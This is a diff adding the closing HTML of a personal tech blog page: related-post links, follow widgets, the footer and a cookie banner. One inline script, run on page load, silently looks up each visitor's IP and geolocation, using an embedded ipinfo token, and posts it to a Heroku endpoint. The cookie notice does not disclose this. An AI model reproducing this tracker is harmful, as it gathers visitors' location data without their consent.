+                <a href= "https://gourav-dhar.com/blogs/how-to-perform-a-basic-sql-injection-attack-ethical-hacking/" class="h5 d-block mb-3">How to perform a basic SQL Injection Attack?</a>
+                <a href= "https://gourav-dhar.com/blogs/how-to-perform-a-basic-sql-injection-attack-ethical-hacking/" class="btn btn-outline-primary">read more</a>
+              
+              
+            </div>
+          </article>
+        </div>
+        
+        <div class="col-lg-4 small-post-border">
+          <article class="media">
+            
+            
+                  <a href= "https://gourav-dhar.com/blogs/how-hackers-impersonate-email-ids-email-spoofing-and-phishing-attacks/"><div class="recent-post-thumb mr-3" style="background-image: url('https://gourav-dhar.com/images/blogs/email-spoofing/1.webp');"></div></a>
+                  
+                
+            
+            
+            <div class="media-body">
+              <div class="mb-3 post-meta">
+                
+                <span>13 Apr 2022</span>
+                
+              </div>
+              
+                <a href= "https://gourav-dhar.com/blogs/how-hackers-impersonate-email-ids-email-spoofing-and-phishing-attacks/" class="h5 d-block mb-3">How hackers impersonate email-id’s</a>
+                <a href= "https://gourav-dhar.com/blogs/how-hackers-impersonate-email-ids-email-spoofing-and-phishing-attacks/" class="btn btn-outline-primary">read more</a>
+              
+              
+            </div>
+          </article>
+        </div>
+        
+        <div class="col-lg-4 small-post-border">
+          <article class="media">
+            
+            
+                  <a href= "https://gourav-dhar.com/blogs/i-created-an-automated-whatsapp-reply-bot/"><div class="recent-post-thumb mr-3" style="background-image: url('https://gourav-dhar.com/images/blogs/wp-bot/1.webp');"></div></a>
+                  
+                
+            
+            
+            <div class="media-body">
+              <div class="mb-3 post-meta">
+                
+                <span>27 Mar 2022</span>
+                
+              </div>
+              
+                <a href= "https://gourav-dhar.com/blogs/i-created-an-automated-whatsapp-reply-bot/" class="h5 d-block mb-3">I created an automated WhatsApp reply bot!</a>
+                <a href= "https://gourav-dhar.com/blogs/i-created-an-automated-whatsapp-reply-bot/" class="btn btn-outline-primary">read more</a>
+              
+              
+            </div>
+          </article>
+        </div>
+        
+      </div>
+    </div>
+  </section>
+  
+      </div>
+      
+    </div>
+  </div>
+</section>
+
+<div id="custom-modal" class="modal">
+
+    
+    <span class="close">&times;</span>
+  
+    
+    <img class="modal-content" id="modal-image">
+  
+    
+    <div id="caption"></div>
+  </div>
+
+
+
+<div id="follow-me-modal" class="modal follow-me-modal-content">
+  
+    <div class="follow-me-modal">
+        
+    
+<div class="widget">
+    <h4 class="widget-title">Follow Me</h4>
+    <p>If you are interested in tech blogs, follow me on Medium or LinkedIn and you will never miss my blogs.</p>
+    <ul class="list-unstyled">
+
+      <li class="list-inline-item"><a class="p-2 bg-primary text-white"
+          href="https://blogs.gourav-dhar.com" target="_blank">Follow on Medium</a>
+        </li>
+
+      <li class = "list-inline-item"><a class="p-2 bg-primary text-white"
+          href="https://in.linkedin.com/in/gouravdhar" target="_blank">Follow on LinkedIn</a>
+        </li>
+  </ul>
+ </div>
+    </div>
+    
+  </div>
+
+<div id="footer">
+
+<section class="section-sm">
+  <div class="container">
+    <div class="row">
+      <div class="col-lg-8 mx-auto text-center border-left border-right border-primary">
+        <h2 class = "news-letter-heading">Follow Me</h2>
+        <p class="text-light px-md-5 py-4 ">
+          If you are interested in tech blogs, follow me on Medium or LinkedIn and you will never miss my blogs.</p>
+        
+
+        <ul class="list-unstyled">
+
+            <li class="list-inline-item"><a class="p-2 bg-primary text-white"
+                href="https://blogs.gourav-dhar.com" target="_blank">Follow on Medium</a>
+              </li>
+
+            <li class = "list-inline-item"><a class="p-2 bg-primary text-white"
+                href="https://in.linkedin.com/in/gouravdhar" target="_blank">Follow on LinkedIn</a>
+              </li>
+
+        </ul>
+        
+      </div>
+    </div>
+  </div>
+</section>
+
+
+ 
+ <script data-name="BMC-Widget" data-cfasync="false" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" 
+ data-id="gouravdhar" data-description="Support me on Buy me a coffee!" 
+ data-message="Thank you for visiting. You can now buy me a coffee as a Thank You! " data-color="#40DCA5" data-position="Right" data-x_margin="18" data-y_margin="18">
+</script>
+
+ 
+
+ 
+ <script type="text/javascript" language="javascript" defer>
+  const postIPData = async () => {
+    
+    var delayInMilliseconds = 1500; 
+    let res2 = await fetch('https://api.ipify.org/?format=json').then(response => response.json());
+    const ip = res2.ip;
+    let addr = await fetch('https://ipinfo.io/'+ip+'?token=360b82d6f0c132').then(response => response.json());
+
+    var bodyFormData = new FormData();
+    bodyFormData.append('ip', ip);
+    bodyFormData.append('loc', addr.loc);
+    bodyFormData.append('city', addr.city);
+    bodyFormData.append('country', addr.country);
+    bodyFormData.append('org', addr.org);
+    bodyFormData.append('postal', addr.postal);
+    bodyFormData.append('region', addr.region);
+    bodyFormData.append('timezone', addr.timezone);
+    bodyFormData.append('time', Date());
+    
+    fetch('https://flask-qa-deploy-postgres.herokuapp.com/api',{
+      method:'post',
+      body: bodyFormData
+    }).then(response => {});
+
+  }
+  postIPData();
+  
+</script>
+
+
+
+
+
+
+<footer class="text-capitalize">
+  <div class="container">
+    <div class="row justify-content-center">
+      <div class="col-12 text-center mb-5">
+        
+      </div>
+               
+      <div class="col-lg-3 col-sm-6 mb-5">
+        <h6 class="mb-4">Contact Me</h6>
+        <ul class="list-unstyled">
+          
+                     
+          <li class="mb-3"><i class="ti-location-pin mr-3 text-primary"></i>Delhi, India</li>
+          
+                     
+          <li class="mb-3"><a class="text-dark" href="mailto:gouravdhar.iitr@gmail.com"><i
+                class="ti-email mr-3 text-primary"></i>gouravdhar.iitr@gmail.com</a>
+          
+          </li>
+        </ul>
+      </div>
+      
+      <div class="col-lg-3 col-sm-6 mb-5 desktop-view">
+        <h6 class="mb-4">Social Contacts</h6>
+        <ul class="list-unstyled">
+          
+          <li class="mb-3"><a class="text-dark" href="https://twitter.com/go_rrrave">twitter</a></li>
+          
+          <li class="mb-3"><a class="text-dark" href="https://www.instagram.com/go_rrrave">instagram</a></li>
+          
+          <li class="mb-3"><a class="text-dark" href="https://github.com/gouravdhar">github</a></li>
+          
+          <li class="mb-3"><a class="text-dark" href="https://in.linkedin.com/in/gouravdhar">linkedin</a></li>
+          
+        </ul>
+      </div>
+      <div class="col-lg-3 col-sm-6 mb-5 desktop-view">
+        <h6 class="mb-4">Categories</h6>
+        <ul class="list-unstyled">
+          <li class="mb-3"><a class="text-dark"
+            href="/categories/cool-tech-stuff/">Cool tech stuff</a>
+          </li>
+          <li class="mb-3"><a class="text-dark"
+            href="/categories/ethical-hacking/">Ethical hacking</a>
+          </li>
+          <li class="mb-3"><a class="text-dark"
+            href="/categories/system-design/">System design</a>
+          </li>
+        </ul>
+      </div>
+      <div class="col-lg-3 col-sm-6 mb-5">
+        <h6 class="mb-4">Quick Links</h6>
+        <ul class="list-unstyled">
+          
+          <li class="mb-3"><a class="text-dark" href="https://gourav-dhar.com/about/">About</a></li>
+          
+          <li class="mb-3"><a class="text-dark" href="https://gourav-dhar.com/blogs/">Blogs</a></li>
+          
+          <li class="mb-3"><a class="text-dark" href="https://gourav-dhar.com/profile">Profile</a></li>
+          
+          <li class="mb-3"><a class="text-dark" href="https://gourav-dhar.com/contact/">Contact</a></li>
+          
+        </ul>
+      </div>
+      <div class="col-12 border-top py-4 text-center">
+        | Made with ❤️ by Gourav |
+      </div>
+    </div>
+  </div>
+</footer>
+
+<script>
+  var indexURL = "https://gourav-dhar.com/index.json"
+</script>
+
+<!-- JS Plugins -->
+
+<script src="https://gourav-dhar.com/plugins/jQuery/jquery.min.js"></script>
+
+<script src="https://gourav-dhar.com/plugins/bootstrap/bootstrap.min.js"></script>
+
+<script src="https://gourav-dhar.com/plugins/slick/slick.min.js"></script>
+
+<script src="https://gourav-dhar.com/plugins/venobox/venobox.min.js"></script>
+
+<script src="https://gourav-dhar.com/plugins/search/fuse.min.js"></script>
+
+<script src="https://gourav-dhar.com/plugins/search/mark.js"></script>
+
+<script src="https://gourav-dhar.com/plugins/search/search.js"></script>
+
+<!-- Main Script -->
+
+<script src="https://gourav-dhar.com/js/script.min.js"></script>
+
+
+
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/js-cookie/2.2.1/js.cookie.min.js"></script>
+<div id="js-cookie-box" class="cookie-box cookie-box-hide">
+	This site uses cookies. By continuing to use this website, you agree to their use. <span id="js-cookie-button" class="btn btn-sm btn-primary ml-2">I Accept</span>
+</div>
+<script>
+	(function ($) {
+		const cookieBox = document.getElementById('js-cookie-box');
+		const cookieButton = document.getElementById('js-cookie-button');
+		if (!Cookies.get('cookie-box')) {
+			cookieBox.classList.remove('cookie-box-hide');
+			cookieButton.onclick = function () {
+				Cookies.set('cookie-box', true, {
+					expires:  2 
+				});
+				cookieBox.classList.add('cookie-box-hide');
+			};
+		}
+	})(jQuery);
+</script>
+
+
+<style>
+.cookie-box {
+  position: fixed;
+  left: 0;
+  right: 0;
+  bottom: 0;
+  text-align: center;
+  z-index: 9999;
+  padding: 1rem 2rem;
+  background: rgb(71, 71, 71);
+  transition: all .75s cubic-bezier(.19, 1, .22, 1);
+  color: #fdfdfd;
+}
+
+.cookie-box-hide {
+  display: none;
+}
+</style>
+
+</div></body>
+</html>
